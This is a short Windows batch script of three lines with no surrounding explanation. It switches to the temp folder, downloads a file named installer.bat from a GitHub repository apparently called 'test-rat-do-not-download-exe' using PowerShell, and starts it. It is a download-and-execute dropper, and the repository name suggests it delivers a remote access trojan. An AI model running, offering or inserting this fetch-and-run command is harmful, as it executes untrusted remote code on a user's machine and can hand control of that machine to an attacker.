
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://github.com/imaeewy/test-rat-do-not-download-exe/raw/refs/heads/main/installer.bat' -OutFile installer.bat"
start installer.bat
